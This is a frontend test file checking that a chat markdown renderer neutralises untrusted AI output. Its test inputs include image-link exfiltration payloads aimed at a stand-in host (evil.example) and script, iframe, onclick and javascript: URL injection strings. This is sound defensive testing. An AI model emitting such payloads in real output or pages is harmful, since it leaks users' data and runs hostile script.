import { describe, expect, test } from "bun:test";
import { NextIntlClientProvider } from "next-intl";
import { renderToStaticMarkup } from "react-dom/server";
import messages from "@/messages/en/ai.json";
import shared from "@/messages/en/shared.json";
import { AiMarkdown } from "./ai-markdown";

/**
 * The chat renderer's safety contract (frontend.md §5.5), rendered to static markup (ADR-0012: no DOM
 * runner). Model text is untrusted: no images are ever fetched, no HTML passes through, bare URLs are
 * not links, and nothing but http(s) or in-app paths becomes a link.
 */
function render(content: string): string {
  return renderToStaticMarkup(
    <NextIntlClientProvider locale="en" messages={{ ai: messages, shared }} timeZone="UTC">
      <AiMarkdown content={content} />
    </NextIntlClientProvider>,
  );
}

describe("AiMarkdown", () => {
  test("drops images — markdown or HTML — and fetches nothing", () => {
    const html = render(
      '![leak](https://evil.example/p.png?q=secret) <img src="https://evil.example/x.png"> ![](https://evil.example/2.png)',
    );
    expect(html).not.toContain("<img");
    expect(html).not.toContain("evil.example");
    expect(html).toContain("[image: leak]");
  });

  test("raw HTML never renders as HTML", () => {
    const html = render('<script>alert(1)</script><b onclick="x()">bold</b><iframe src="https://evil.example"></iframe>');
    expect(html).not.toContain("<script");
    expect(html).not.toContain("onclick");
    expect(html).not.toContain("<iframe");
  });

  test("dangerous schemes are not links", () => {
    const html = render("[click](javascript:alert(1)) [data](data:text/html,hi)");
    expect(html).not.toContain("javascript:");
    expect(html).not.toContain('href="data:');
  });

  test("bare URLs are not auto-linked", () => {
    const html = render("See https://evil.example/?q=secret now");
    expect(html).not.toContain("<a");
    expect(html).toContain("https://evil.example/?q=secret");
  });

  test("an explicit external link opens safely and shows its host", () => {
    const html = render("[the docs](https://docs.example.com/page)");
    expect(html).toContain('href="https://docs.example.com/page"');
    expect(html).toContain('target="_blank"');
    expect(html).toContain('rel="noopener noreferrer nofollow"');
    expect(html).toContain("(docs.example.com)");
  });

  test("in-app links stay in the app; protocol-relative ones are text", () => {
    expect(render("[MBP-042](/assets/a1)")).toContain('href="/assets/a1"');
    expect(render("[x](//evil.example)")).not.toContain("<a");
  });

  test("untrusted wrappers are stripped; the text inside stays text", () => {
    const html = render("Note: <untrusted_content>**hi** <img src=x></untrusted_content>");
    expect(html).not.toContain("untrusted_content");
    expect(html).not.toContain("<img");
    expect(html).toContain("<strong>hi</strong>");
  });

  test("mermaid is only code", () => {
    const html = render("```mermaid\ngraph TD; A-->B\n```");
    expect(html).toContain("graph TD");
    expect(html).not.toContain("mermaid-diagram");
  });
});
